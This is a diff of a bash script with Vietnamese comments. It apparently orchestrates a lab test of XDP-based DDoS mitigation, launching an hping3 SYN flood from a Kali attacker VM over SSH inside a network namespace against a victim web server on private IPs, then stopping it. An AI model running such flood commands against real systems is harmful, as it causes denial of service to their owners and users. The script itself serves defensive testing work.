@@ -28,8 +28,13 @@ set -e
 # CẤU HÌNH
 # ---------------------------------------------------------------------------
 
-ATTACKER_IP="10.10.1.2"
-ATTACKER_SSH_USER="kali"         # Username SSH trên Attacker VM — SỬA LẠI!
+ATTACKER_IP="10.10.1.2"          # IP chính của Attacker VM — chỉ dùng để SSH
+ATTACKER_SSH_USER="kali"          # Username SSH trên Attacker VM
+ATTACKER_NS="ns_10"               # Network namespace dùng để tấn công
+ATTACKER_NS_IP="10.10.1.10"       # IP của ns_10 — source IP thực tế của attack
+                                   # Dùng ns_10 thay vì eth0 (10.10.1.2) để:
+                                   #   1. XDP block 10.10.1.10 không ảnh hưởng SSH
+                                   #   2. Phân tách rõ ràng attacker vs SSH control plane
 VICTIM_IP="10.10.2.2"
 VICTIM_PORT="80"
 
@@ -86,28 +91,70 @@ check_root() {
     fi
 }
 
-# Gửi lệnh tấn công sang Attacker VM qua SSH và chạy background
-# Trả về PID của SSH process để có thể kill sau
+# Gửi lệnh tấn công sang Attacker VM qua SSH, chạy trong namespace ns_10
+# Source IP sẽ là 10.10.1.10 (không phải 10.10.1.2) — đảm bảo XDP block
+# không ảnh hưởng đến SSH control plane qua eth0
 start_attack() {
-    log "[ATTACK] Bắt đầu SYN Flood từ $ATTACKER_IP → $VICTIM_IP:$VICTIM_PORT"
-    log "[ATTACK] Source IP cố định: $ATTACKER_IP (không random, để Iptables nhận diện được)"
-    
-    ssh -o StrictHostKeyChecking=no "$ATTACKER_SSH_USER@$ATTACKER_IP" \
-        "nohup hping3 -S -p $VICTIM_PORT --flood $VICTIM_IP > /tmp/hping3.log 2>&1 &
-         echo \$!" > /tmp/attack_pid.txt &
-    
-    SSH_PID=$!
-    sleep 2  # Đợi SSH kết nối và lệnh khởi động
-    log "[ATTACK] SYN Flood đang chạy (SSH PID: $SSH_PID)"
-    echo $SSH_PID
+    log "[ATTACK] Kiểm tra SSH đến Attacker VM ($ATTACKER_SSH_USER@$ATTACKER_IP)..."
+
+    # Kiểm tra SSH trước, log kết quả rõ ràng
+    if ! ssh -o StrictHostKeyChecking=no -o BatchMode=yes \
+             -o ConnectTimeout=5 \
+             "$ATTACKER_SSH_USER@$ATTACKER_IP" "echo SSH_OK" 2>/dev/null | grep -q SSH_OK; then
+        log "[ATTACK][ERROR] Không thể SSH đến $ATTACKER_IP. Kiểm tra kết nối!"
+        MANUAL_ATTACK=true
+        return 1
+    fi
+    log "[ATTACK][OK] SSH đến $ATTACKER_IP thành công."
+
+    # Kiểm tra namespace ns_10 tồn tại
+    if ! ssh -o StrictHostKeyChecking=no -o BatchMode=yes \
+             "$ATTACKER_SSH_USER@$ATTACKER_IP" \
+             "ip netns list | grep -q $ATTACKER_NS" 2>/dev/null; then
+        log "[ATTACK][ERROR] Namespace '$ATTACKER_NS' không tồn tại trên Attacker VM!"
+        log "[ATTACK]        Tạo bằng: sudo ip netns add $ATTACKER_NS && ..."
+        MANUAL_ATTACK=true
+        return 1
+    fi
+    log "[ATTACK][OK] Namespace $ATTACKER_NS (source IP: $ATTACKER_NS_IP) đã sẵn sàng."
+
+    # Khởi động hping3 trong namespace ns_10
+    log "[ATTACK] Bắt đầu SYN Flood: $ATTACKER_NS_IP → $VICTIM_IP:$VICTIM_PORT"
+    HPING_PID=$(ssh -o StrictHostKeyChecking=no -o BatchMode=yes \
+        "$ATTACKER_SSH_USER@$ATTACKER_IP" \
+        "ip netns exec $ATTACKER_NS hping3 -S -p $VICTIM_PORT --flood $VICTIM_IP \
+         > /tmp/hping3.log 2>&1 & echo \$!" 2>/dev/null)
+
+    # Xác nhận hping3 đã thực sự khởi động
+    sleep 1
+    if [[ -z "$HPING_PID" || ! "$HPING_PID" =~ ^[0-9]+$ ]]; then
+        log "[ATTACK][ERROR] Không lấy được PID của hping3 — có thể lệnh không chạy!"
+        MANUAL_ATTACK=true
+        return 1
+    fi
+
+    # Xác nhận process thực sự đang chạy trên Attacker VM
+    if ssh -o StrictHostKeyChecking=no -o BatchMode=yes \
+           "$ATTACKER_SSH_USER@$ATTACKER_IP" \
+           "ps -p $HPING_PID > /dev/null 2>&1" 2>/dev/null; then
+        log "[ATTACK][OK] hping3 đang chạy trong $ATTACKER_NS (PID: $HPING_PID, src: $ATTACKER_NS_IP)"
+        echo "$HPING_PID" > /tmp/attack_pid.txt
+    else
+        log "[ATTACK][WARN] PID $HPING_PID không tồn tại — hping3 có thể đã crash. Xem /tmp/hping3.log."
+    fi
 }
 
 # Dừng tấn công
 stop_attack() {
     log "[ATTACK] Đang dừng SYN Flood..."
-    ssh -o StrictHostKeyChecking=no "$ATTACKER_SSH_USER@$ATTACKER_IP" \
-        "pkill -f hping3 || true" 2>/dev/null || true
-    log "[ATTACK] SYN Flood đã dừng."
+    if ssh -o StrictHostKeyChecking=no -o BatchMode=yes \
+           "$ATTACKER_SSH_USER@$ATTACKER_IP" \
+           "pkill -f hping3; sleep 1; pgrep hping3 || echo STOPPED" 2>/dev/null | grep -q STOPPED; then
+        log "[ATTACK][OK] hping3 đã dừng trên Attacker VM."
+    else
+        log "[ATTACK][WARN] Không xác nhận được hping3 đã dừng — kiểm tra thủ công."
+    fi
+    rm -f /tmp/attack_pid.txt
 }
 
 # Reset XDP rules (xóa tất cả rules khỏi BPF Map)
